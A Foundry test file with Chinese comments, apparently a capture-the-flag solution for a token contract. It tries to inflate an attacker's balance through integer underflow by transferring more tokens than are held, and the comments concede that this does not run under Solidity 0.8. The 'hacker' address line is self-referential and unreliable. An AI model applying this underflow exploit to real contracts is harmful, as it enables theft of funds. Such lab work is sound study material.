pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Token.sol";


/** 
 * 解题思路：利用 solidity 0.6.0 版本的漏洞，通过溢出来为 balance 赋值大的值，这个漏洞到 0.8 版本已经修复。
 * 但是这里也需要注意涉及到数值计算的地方，尽量使用 openzeppelin 的标准库来实现
 */
contract HackTokenTest is Test {
    address hacker = address(hacker);
    address zeroAddr = address(0);
    Token public t1;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        t1 = new Token(20);
    }
    function testToken() public {
        vm.startPrank(hacker);

        // 解题思路，由于版本的问题，代码无法在这里跑通
        t1.transfer(zeroAddr, 21);
        console.log("balance:");
        console.logUint(t1.balanceOf(hacker));
        vm.stopPrank();
    }
}